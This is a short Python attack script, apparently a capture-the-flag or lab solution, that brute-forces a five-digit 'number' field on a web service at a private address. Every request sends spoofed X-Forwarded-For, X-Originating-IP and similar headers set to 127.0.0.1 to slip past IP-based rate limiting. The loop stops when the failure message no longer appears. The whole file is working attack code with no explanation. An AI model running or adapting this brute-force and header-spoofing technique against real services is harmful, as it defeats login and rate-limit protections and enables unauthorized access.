import requests
import sys

url = 'http://10.201.87.7:8085/'

for i in range(10000,100000):
        headers = {
                "X-Originating-IP": "127.0.0.1",
                "X-Forwarded-For": "127.0.0.1",
                "X-Remote-IP": "127.0.0.1",
                "X-Remote-Addr": "127.0.0.1",
                "X-Client-IP": "127.0.0.1",
                "X-Host": "127.0.0.1",
                "X-Forwared-Host": "127.0.0.1"
        }
        data = {"number":i}
        print(f"Trying number: {i}")
        r = requests.post(url=url,data=data,headers=headers)
        if "Oh no! How unlucky. Spin the wheel and try again." not in r.text:
                print(f"found lucky number: {i}")
                quit()
